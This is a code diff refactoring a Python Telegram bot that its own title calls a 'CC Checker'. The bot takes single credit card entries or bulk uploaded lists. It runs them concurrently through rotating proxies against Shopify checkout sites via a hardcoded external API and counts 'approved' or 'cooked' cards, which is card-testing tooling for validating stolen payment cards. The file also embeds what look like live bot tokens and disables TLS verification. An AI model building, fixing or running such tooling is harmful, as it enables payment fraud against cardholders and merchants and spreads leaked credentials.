@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-COMPLETE Telegram CC Checker Bot - FIXED VERSION
+COMPLETE Telegram CC Checker Bot - FIXED GLOBAL VARIABLE ISSUE
 python-telegram-bot v21.7
 """
 
@@ -37,7 +37,7 @@ from telegram.constants import ParseMode
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ========== CONFIGURATION ==========
-BOT_TOKEN = "8504531890:AAG7DQHq-JH08llODepRct1rY7RQXpaxsU4"
+BOT_TOKEN = "8504531890:AAH6q920rSX3xmk1YqgegAjlBm2syr7TiVE"
 OWNER_ID = 6821529235
 API_BASE_URL = "http://140.99.254.73:3000/checkout"
 
@@ -78,103 +78,118 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ========== GLOBAL DATA ==========
-sites = []
-proxies = []
-stats = {
-    "total_checks": 0,
-    "approved": 0,
-    "declined": 0,
-    "expired": 0,
-    "error": 0,
-    "mass_checks": 0,
-    "sites_count": 0,
-    "proxies_count": 0
-}
+# ========== DATA STORE CLASS ==========
+class DataStore:
+    """Centralized data store to manage global state"""
+    def __init__(self):
+        self.sites = []
+        self.proxies = []
+        self.stats = {
+            "total_checks": 0,
+            "approved": 0,
+            "declined": 0,
+            "expired": 0,
+            "error": 0,
+            "mass_checks": 0,
+            "sites_count": 0,
+            "proxies_count": 0
+        }
+        self.load_data()
+    
+    def load_data(self):
+        """Load data from JSON files"""
+        try:
+            if SITES_FILE.exists():
+                with open(SITES_FILE, 'r') as f:
+                    loaded = json.load(f)
+                    if isinstance(loaded, list):
+                        self.sites = loaded
+                    else:
+                        self.sites = ["https://9marks.myshopify.com"]
+            else:
+                self.sites = ["https://9marks.myshopify.com"]
+        except Exception as e:
+            logger.error(f"Error loading sites: {e}")
+            self.sites = ["https://9marks.myshopify.com"]
+        
+        try:
+            if PROXIES_FILE.exists():
+                with open(PROXIES_FILE, 'r') as f:
+                    loaded = json.load(f)
+                    if isinstance(loaded, list):
+                        self.proxies = loaded
+                        logger.info(f"✅ Loaded {len(self.proxies)} proxies from {PROXIES_FILE}")
+                    else:
+                        self.proxies = []
+            else:
+                self.proxies = []
+        except Exception as e:
+            logger.error(f"Error loading proxies: {e}")
+            self.proxies = []
+        
+        try:
+            if STATS_FILE.exists():
+                with open(STATS_FILE, 'r') as f:
+                    loaded_stats = json.load(f)
+                    for key in self.stats:
+                        if key in loaded_stats:
+                            self.stats[key] = loaded_stats[key]
+        except Exception as e:
+            logger.error(f"Error loading stats: {e}")
+        
+        SCRIPTS_DIR.mkdir(exist_ok=True)
+    
+    def save_proxies(self):
+        """Save proxies to file"""
+        try:
+            with open(PROXIES_FILE, 'w') as f:
+                json.dump(self.proxies, f, indent=2)
+            logger.info(f"💾 Saved {len(self.proxies)} proxies to {PROXIES_FILE}")
+        except Exception as e:
+            logger.error(f"Error saving proxies: {e}")
+    
+    def save_sites(self):
+        """Save sites to file"""
+        try:
+            with open(SITES_FILE, 'w') as f:
+                json.dump(self.sites, f, indent=2)
+        except Exception as e:
+            logger.error(f"Error saving sites: {e}")
+    
+    def save_stats(self):
+        """Save stats to file"""
+        try:
+            with open(STATS_FILE, 'w') as f:
+                json.dump(self.stats, f, indent=2)
+        except Exception as e:
+            logger.error(f"Error saving stats: {e}")
+    
+    def update_stats(self, status: str, mass_check: bool = False):
+        """Update bot statistics"""
+        self.stats["total_checks"] += 1
+        if status == 'APPROVED' or status == 'APPROVED_OTP':
+            self.stats["approved"] += 1
+        elif status == 'DECLINED':
+            self.stats["declined"] += 1
+        elif status == 'EXPIRED':
+            self.stats["expired"] += 1
+        elif status == 'ERROR':
+            self.stats["error"] += 1
+        
+        if mass_check:
+            self.stats["mass_checks"] += 1
+        
+        self.stats["sites_count"] = len(self.sites)
+        self.stats["proxies_count"] = len(self.proxies)
+        
+        self.save_stats()
+
+# ========== GLOBAL DATA STORE ==========
+# SINGLE global instance that all handlers will use
+data_store = DataStore()
 
 # Test CC for site testing
 TEST_CC = "4263703530924474|06|2026|400"
-
-# ========== DATA MANAGEMENT FUNCTIONS ==========
-def load_data():
-    """Load data from JSON files"""
-    global sites, proxies, stats
-    
-    try:
-        if SITES_FILE.exists():
-            with open(SITES_FILE, 'r') as f:
-                loaded = json.load(f)
-                if isinstance(loaded, list):
-                    sites = loaded
-                else:
-                    sites = ["https://9marks.myshopify.com"]
-        else:
-            sites = ["https://9marks.myshopify.com"]
-    except Exception as e:
-        logger.error(f"Error loading sites: {e}")
-        sites = ["https://9marks.myshopify.com"]
-    
-    try:
-        if PROXIES_FILE.exists():
-            with open(PROXIES_FILE, 'r') as f:
-                loaded = json.load(f)
-                if isinstance(loaded, list):
-                    proxies = loaded
-                    logger.info(f"Loaded {len(proxies)} proxies from file")
-                else:
-                    proxies = []
-        else:
-            proxies = []
-    except Exception as e:
-        logger.error(f"Error loading proxies: {e}")
-        proxies = []
-    
-    try:
-        if STATS_FILE.exists():
-            with open(STATS_FILE, 'r') as f:
-                loaded_stats = json.load(f)
-                for key in stats:
-                    if key in loaded_stats:
-                        stats[key] = loaded_stats[key]
-    except Exception as e:
-        logger.error(f"Error loading stats: {e}")
-    
-    SCRIPTS_DIR.mkdir(exist_ok=True)
-
-def save_data(data_type: str):
-    """Save data to JSON files"""
-    try:
-        if data_type == "sites":
-            with open(SITES_FILE, 'w') as f:
-                json.dump(sites, f, indent=2)
-        elif data_type == "proxies":
-            with open(PROXIES_FILE, 'w') as f:
-                json.dump(proxies, f, indent=2)
-        elif data_type == "stats":
-            with open(STATS_FILE, 'w') as f:
-                json.dump(stats, f, indent=2)
-    except Exception as e:
-        logger.error(f"Error saving {data_type}: {e}")
-
-def update_stats(status: str, mass_check: bool = False):
-    """Update bot statistics"""
-    stats["total_checks"] += 1
-    if status == 'APPROVED' or status == 'APPROVED_OTP':
-        stats["approved"] += 1
-    elif status == 'DECLINED':
-        stats["declined"] += 1
-    elif status == 'EXPIRED':
-        stats["expired"] += 1
-    elif status == 'ERROR':
-        stats["error"] += 1
-    
-    if mass_check:
-        stats["mass_checks"] += 1
-    
-    stats["sites_count"] = len(sites)
-    stats["proxies_count"] = len(proxies)
-    
-    save_data("stats")
 
 # ========== HELPER FUNCTIONS ==========
 def extract_cc(text: str) -> Optional[str]:
@@ -306,7 +321,7 @@ def get_concurrent_limit(proxy_count: int) -> int:
     return 0
 
 def is_valid_response(response_text: str) -> bool:
-    """Check if API response is valid - FIXED VERSION"""
+    """Check if API response is valid"""
     if not response_text or not isinstance(response_text, str):
         return False
     
@@ -338,7 +353,7 @@ def is_valid_response(response_text: str) -> bool:
     return True
 
 def process_response(api_response: str, price: float = 0.00) -> Tuple[str, str, str]:
-    """Process API response and determine status - FIXED VERSION"""
+    """Process API response and determine status"""
     if not api_response or not isinstance(api_response, str):
         return "NO RESPONSE", "ERROR", "$0.00"
     
@@ -404,7 +419,7 @@ def process_response(api_response: str, price: float = 0.00) -> Tuple[str, str, 
         return api_response, 'DECLINED', f"${price:.2f}"
 
 def test_proxy_with_api(proxy_dict: Dict[str, str], site_url: str) -> Tuple[bool, str, float]:
-    """Test proxy with actual API call - FIXED VERSION"""
+    """Test proxy with actual API call"""
     try:
         cc = TEST_CC
         api_url = f"{API_BASE_URL}?cc={cc}&site={site_url}"
@@ -438,7 +453,7 @@ def test_proxy_with_api(proxy_dict: Dict[str, str], site_url: str) -> Tuple[bool
             response_text = response.text.strip()
             logger.info(f"Proxy test response: {response_text[:100]}")
             
-            # Proxy test SUCCESS if we get ANY valid response (not just "APPROVED")
+            # Proxy test SUCCESS if we get ANY valid response
             if is_valid_response(response_text):
                 return True, response_text, response_time
             else:
@@ -455,15 +470,9 @@ def test_proxy_with_api(proxy_dict: Dict[str, str], site_url: str) -> Tuple[bool
     except requests.exceptions.ConnectionError as e:
         logger.error(f"Connection error: {e}")
         return False, f"Connection Error: {str(e)}", 0.0
-    except requests.exceptions.Timeout as e:
-        logger.error(f"Request timeout: {e}")
-        return False, f"Request Timeout: {str(e)}", 0.0
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Request exception: {e}")
-        return False, f"Request Exception: {str(e)}", 0.0
     except Exception as e:
-        logger.error(f"Unexpected error in proxy test: {e}")
-        return False, f"Unexpected Error: {str(e)}", 0.0
+        logger.error(f"Error in proxy test: {e}")
+        return False, f"Error: {str(e)}", 0.0
 
 def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, Any]:
     """Main check function with proxy"""
@@ -483,11 +492,9 @@ def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, 
         
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1'
+            'Connection': 'keep-alive'
         }
         
         proxy_config = {
@@ -503,8 +510,7 @@ def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, 
             headers=headers,
             proxies=proxy_config,
             timeout=REQUEST_TIMEOUT,
-            verify=False,
-            allow_redirects=True
+            verify=False
         )
         
         response_time = time.time() - start_time
@@ -552,14 +558,8 @@ def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, 
     except requests.exceptions.ConnectionError as e:
         result["error"] = f"Connection Error: {str(e)}"
         result["response"] = "Connection Failed"
-    except requests.exceptions.Timeout as e:
-        result["error"] = f"Request Timeout: {str(e)}"
-        result["response"] = "Timeout"
-    except requests.exceptions.RequestException as e:
-        result["error"] = f"Request Error: {str(e)}"
-        result["response"] = "Request Failed"
     except Exception as e:
-        result["error"] = f"Unexpected Error: {str(e)}"
+        result["error"] = f"Error: {str(e)}"
         result["response"] = "System Error"
     
     return result
@@ -651,8 +651,8 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_name = user.first_name or "User"
     
-    proxy_count = len(proxies)
-    site_count = len(sites)
+    proxy_count = len(data_store.proxies)
+    site_count = len(data_store.sites)
     concurrent_limit = get_concurrent_limit(proxy_count)
     
     message = f"""
@@ -700,13 +700,16 @@ Reply to a message with CC
     await update.message.reply_text(message, parse_mode=ParseMode.HTML)
 
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /chk command - FIXED VERSION"""
+    """Handle /chk command"""
     user = update.effective_user
     
-    # Debug: Show proxies count
-    logger.info(f"chk_command: Checking proxies list. Count: {len(proxies)}")
+    # Use the global data_store
+    proxies_list = data_store.proxies
+    sites_list = data_store.sites
     
-    if not proxies:
+    logger.info(f"chk_command: Checking {len(proxies_list)} proxies from data_store")
+    
+    if not proxies_list:
         await update.message.reply_text(
             "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
             "You must add at least 1 proxy before checking.\n"
@@ -716,7 +719,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    if not sites:
+    if not sites_list:
         await update.message.reply_text("❌ No sites available. Use /addsite to add a site first.")
         return
     
@@ -737,20 +740,17 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     processing_msg = await update.message.reply_text("🔄 Checking card with proxy...")
     
-    # Debug: Show proxy being used
-    logger.info(f"chk_command: Using proxy from list of {len(proxies)} proxies")
+    proxy_dict = random.choice(proxies_list)
+    site = random.choice(sites_list)
     
-    proxy_dict = random.choice(proxies)
-    site = random.choice(sites)
-    
-    logger.info(f"chk_command: Checking with proxy: {proxy_dict['host']}:{proxy_dict['port']}")
+    logger.info(f"chk_command: Using proxy: {proxy_dict['host']}:{proxy_dict['port']}")
     
     result = check_site(site, cc, proxy_dict)
     
     card_number = cc.split('|')[0]
     bin_info = get_bin_info(card_number)
     
-    update_stats(result["status"], mass_check=False)
+    data_store.update_stats(result["status"], mass_check=False)
     
     user_name = user.first_name or user.username or "User"
     message = format_message(cc, result, bin_info, proxy_dict["string"], 
@@ -761,10 +761,12 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /mass command"""
-    # Debug
-    logger.info(f"mass_command: Proxies count: {len(proxies)}")
+    proxies_list = data_store.proxies
+    sites_list = data_store.sites
     
-    if not proxies:
+    logger.info(f"mass_command: Proxies count: {len(proxies_list)}")
+    
+    if not proxies_list:
         await update.message.reply_text(
             "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
             "You must add at least 1 proxy before mass checking.\n"
@@ -773,11 +775,11 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    if not sites:
+    if not sites_list:
         await update.message.reply_text("❌ No sites available. Use /addsite to add a site first.")
         return
     
-    proxy_count = len(proxies)
+    proxy_count = len(proxies_list)
     concurrent_limit = get_concurrent_limit(proxy_count)
     
     message = (
@@ -790,7 +792,7 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(message, parse_mode=ParseMode.HTML)
 
 async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /addproxy command - FIXED VERSION"""
+    """Handle /addproxy command"""
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("❌ Owner only command.")
         return
@@ -801,13 +803,16 @@ async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     proxy_str = ' '.join(context.args)
     
+    # Use the global data_store
+    proxies_list = data_store.proxies
+    
     # Check if proxy already exists
-    for proxy in proxies:
+    for proxy in proxies_list:
         if proxy["string"] == proxy_str:
             await update.message.reply_text("⚠️ Proxy already exists.")
             return
     
-    if len(proxies) >= MAX_PROXIES:
+    if len(proxies_list) >= MAX_PROXIES:
         await update.message.reply_text(f"❌ Maximum {MAX_PROXIES} proxies allowed. Use /clearproxies to remove some.")
         return
     
@@ -818,20 +823,19 @@ async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     test_msg = await update.message.reply_text("🔄 Testing proxy with API...")
     
-    site = sites[0] if sites else "https://9marks.myshopify.com"
+    site = data_store.sites[0] if data_store.sites else "https://9marks.myshopify.com"
     success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
     
-    # FIX: Consider ANY valid API response as success (not just "APPROVED")
+    # Consider ANY valid API response as success
     if success or (is_valid_response(response_text) and not "Proxy Error" in response_text):
-        # Add proxy to list
-        proxies.append(proxy_dict)
-        save_data("proxies")
+        # Add to data_store
+        proxies_list.append(proxy_dict)
+        data_store.save_proxies()
         
-        # Debug
-        logger.info(f"addproxy_command: Added proxy. Total proxies now: {len(proxies)}")
-        logger.info(f"addproxy_command: Saved to {PROXIES_FILE}")
+        # Update proxies list in data_store
+        data_store.proxies = proxies_list
         
-        concurrent_limit = get_concurrent_limit(len(proxies))
+        concurrent_limit = get_concurrent_limit(len(proxies_list))
         
         await test_msg.delete()
         await update.message.reply_text(
@@ -839,11 +843,15 @@ async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
             f"<b>User:</b> {proxy_dict['username']}\n"
             f"<b>Status:</b> Working with API ✅\n\n"
-            f"📊 <b>Proxies:</b> {len(proxies)}/{MAX_PROXIES}\n"
+            f"📊 <b>Proxies:</b> {len(proxies_list)}/{MAX_PROXIES}\n"
             f"⚡ <b>Concurrent Limit:</b> {concurrent_limit} cards\n\n"
             f"<i>More proxies = faster mass checking!</i>",
             parse_mode=ParseMode.HTML
         )
+        
+        # DEBUG: Show current state
+        logger.info(f"addproxy_command: Added proxy. Total now: {len(data_store.proxies)}")
+        logger.info(f"addproxy_command: Proxies in data_store: {[p['host'] for p in data_store.proxies]}")
     else:
         await test_msg.delete()
         await update.message.reply_text(
@@ -857,19 +865,21 @@ async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def listproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /listproxies command"""
-    logger.info(f"listproxies_command: Proxies count: {len(proxies)}")
+    proxies_list = data_store.proxies
     
-    if not proxies:
+    logger.info(f"listproxies_command: Proxies count: {len(proxies_list)}")
+    
+    if not proxies_list:
         await update.message.reply_text("❌ No proxies available.")
         return
     
     message = "🌐 <b>Available Proxies:</b>\n\n"
     
-    for i, proxy in enumerate(proxies, 1):
+    for i, proxy in enumerate(proxies_list, 1):
         message += f"{i}. <code>{proxy['host']}:{proxy['port']}</code>\n"
         message += f"   👤 {proxy['username']}\n"
     
-    message += f"\n📊 Total: {len(proxies)}/{MAX_PROXIES}"
+    message += f"\n📊 Total: {len(proxies_list)}/{MAX_PROXIES}"
     
     await update.message.reply_text(message, parse_mode=ParseMode.HTML)
 
@@ -879,20 +889,22 @@ async def clearproxies_command(update: Update, context: ContextTypes.DEFAULT_TYP
         await update.message.reply_text("❌ Owner only command.")
         return
     
-    if not proxies:
+    proxies_list = data_store.proxies
+    
+    if not proxies_list:
         await update.message.reply_text("⚠️ No proxies to clear.")
         return
     
-    count = len(proxies)
-    proxies.clear()
-    save_data("proxies")
+    count = len(proxies_list)
+    data_store.proxies = []
+    data_store.save_proxies()
     
     logger.info(f"clearproxies_command: Cleared {count} proxies")
     
     await update.message.reply_text(f"✅ Cleared {count} proxies.")
 
 async def testproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /testproxy command - FIXED VERSION"""
+    """Handle /testproxy command"""
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("❌ Owner only command.")
         return
@@ -910,12 +922,11 @@ async def testproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     test_msg = await update.message.reply_text("🔄 Testing proxy with API call...")
     
-    site = sites[0] if sites else "https://9marks.myshopify.com"
+    site = data_store.sites[0] if data_store.sites else "https://9marks.myshopify.com"
     success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
     
-    # FIX: Show the actual API response and consider it successful if we got ANY response
+    # Show the actual API response
     if success or (is_valid_response(response_text) and not "Proxy Error" in response_text):
-        # Try to parse JSON response
         try:
             if response_text.startswith('{') and response_text.endswith('}'):
                 data = json.loads(response_text)
@@ -988,139 +999,39 @@ async def addsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://")
         return
     
-    if url in sites:
+    if url in data_store.sites:
         await update.message.reply_text("⚠️ Site already exists.")
         return
     
-    sites.append(url)
-    save_data("sites")
+    data_store.sites.append(url)
+    data_store.save_sites()
     
     await update.message.reply_text(f"✅ Site added: {url}")
 
-async def maddsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /maddsites command"""
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("❌ Owner only command.")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /maddsites URL1 URL2 ...")
-        return
-    
-    added = 0
-    existing = 0
-    
-    for url in context.args:
-        url = url.strip()
-        if url.startswith(('http://', 'https://')):
-            if url not in sites:
-                sites.append(url)
-                added += 1
-            else:
-                existing += 1
-    
-    if added > 0:
-        save_data("sites")
-    
-    await update.message.reply_text(f"✅ Added {added} new sites, {existing} already existed.")
-
 async def listsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /listsites command"""
-    if not sites:
+    if not data_store.sites:
         await update.message.reply_text("❌ No sites available.")
         return
     
     message = "🔗 <b>Available Sites:</b>\n\n"
     
-    for i, site in enumerate(sites, 1):
+    for i, site in enumerate(data_store.sites, 1):
         message += f"{i}. {site}\n"
     
-    message += f"\n📊 Total: {len(sites)}"
+    message += f"\n📊 Total: {len(data_store.sites)}"
     
     await update.message.reply_text(message, parse_mode=ParseMode.HTML)
 
-async def clearsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /clearsites command"""
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("❌ Owner only command.")
-        return
-    
-    if not sites:
-        await update.message.reply_text("⚠️ No sites to clear.")
-        return
-    
-    count = len(sites)
-    sites.clear()
-    sites.append("https://9marks.myshopify.com")
-    save_data("sites")
-    
-    await update.message.reply_text(f"✅ Cleared {count} sites (default site added).")
-
-async def testsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /testsite command"""
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("❌ Owner only command.")
-        return
-    
-    if not proxies:
-        await update.message.reply_text("❌ No proxies available. Add a proxy first to test the site.")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /testsite URL")
-        return
-    
-    url = ' '.join(context.args).strip()
-    
-    if not url.startswith(('http://', 'https://')):
-        await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://")
-        return
-    
-    test_msg = await update.message.reply_text("🔄 Testing site with proxy...")
-    
-    proxy_dict = random.choice(proxies)
-    
-    success, response_text, response_time = test_proxy_with_api(proxy_dict, url)
-    
-    if success:
-        processed_response, status, gateway = process_response(response_text, 0.00)
-        emoji = status_emoji.get(status, "⚠️")
-        status_display = status_text.get(status, status)
-    else:
-        emoji = "❌"
-        status_display = "FAILED"
-        processed_response = response_text[:100] if response_text else "No response"
-        gateway = "Unknown"
-    
-    await test_msg.delete()
-    
-    message = f"""
-┌─────────────────
-│ 🔬 SITE TEST RESULT
-└─────────────────
-
-<b>🔗 Site:</b> {url}
-<b>💳 Test CC:</b> {TEST_CC}
-<b>🌐 Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}
-<b>⏱️ Response Time:</b> {response_time:.2f}s
-
-<b>📊 Status:</b> {emoji} {status_display}
-<b>📝 Response:</b> {processed_response}
-<b>⚡ Gateway:</b> {gateway}
-<b>💰 Price:</b> $0.00
-"""
-    
-    await update.message.reply_text(message.strip(), parse_mode=ParseMode.HTML)
-
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /stats command"""
-    proxy_count = len(proxies)
-    site_count = len(sites)
+    proxy_count = len(data_store.proxies)
+    site_count = len(data_store.sites)
     concurrent_limit = get_concurrent_limit(proxy_count)
     
-    total = stats["total_checks"]
-    approved = stats["approved"]
-    declined = stats["declined"]
+    total = data_store.stats["total_checks"]
+    approved = data_store.stats["approved"]
+    declined = data_store.stats["declined"]
     
     success_rate = (approved / total * 100) if total > 0 else 0
     
@@ -1134,7 +1045,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <b>🍳 Cooked:</b> {approved}
 <b>❌ Declined:</b> {declined}
 
-<b>📁 Mass Checks:</b> {stats["mass_checks"]}
+<b>📁 Mass Checks:</b> {data_store.stats["mass_checks"]}
 <b>🌐 Total Proxies:</b> {proxy_count}/20
 <b>⚡ Concurrent Limit:</b> {concurrent_limit}
 <b>🔗 Total Sites:</b> {site_count}
@@ -1146,7 +1057,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle TXT file upload for mass check"""
-    if not proxies:
+    if not data_store.proxies:
         await update.message.reply_text(
             "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
             "You must add at least 1 proxy before mass checking.",
@@ -1154,7 +1065,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    if not sites:
+    if not data_store.sites:
         await update.message.reply_text("❌ No sites available.")
         return
     
@@ -1179,9 +1090,9 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ccs = ccs[:MAX_MASS_CARDS]
         
         total_cards = len(ccs)
-        proxy_count = len(proxies)
+        proxy_count = len(data_store.proxies)
         concurrent_limit = get_concurrent_limit(proxy_count)
-        site = random.choice(sites)
+        site = random.choice(data_store.sites)
         
         status_msg = await update.message.reply_text(
             f"🔄 Processing {total_cards} cards...\n\n"
@@ -1200,7 +1111,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             futures = []
             
             for cc in ccs:
-                proxy = random.choice(proxies)
+                proxy = random.choice(data_store.proxies)
                 future = executor.submit(check_site, site, cc, proxy)
                 futures.append((future, cc, proxy["string"]))
             
@@ -1214,7 +1125,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     else:
                         declined_cards.append(cc)
                     
-                    update_stats(result["status"], mass_check=True)
+                    data_store.update_stats(result["status"], mass_check=True)
                     
                     if checked_count % 10 == 0 or checked_count == total_cards:
                         await status_msg.edit_text(
@@ -1273,14 +1184,12 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ========== MAIN FUNCTION ==========
 def main():
     """Start the bot"""
-    load_data()
-    
     print(f"🤖 Bot starting up...")
-    print(f"🌐 Proxies loaded: {len(proxies)}")
-    print(f"🔗 Sites loaded: {len(sites)}")
-    print(f"📊 Total checks: {stats['total_checks']}")
-    print(f"✅ Approved: {stats['approved']}")
-    print(f"❌ Declined: {stats['declined']}")
+    print(f"🌐 Proxies loaded: {len(data_store.proxies)}")
+    print(f"🔗 Sites loaded: {len(data_store.sites)}")
+    print(f"📊 Total checks: {data_store.stats['total_checks']}")
+    print(f"✅ Approved: {data_store.stats['approved']}")
+    print(f"❌ Declined: {data_store.stats['declined']}")
     
     print(f"🔑 Using token: {BOT_TOKEN[:10]}...")
     
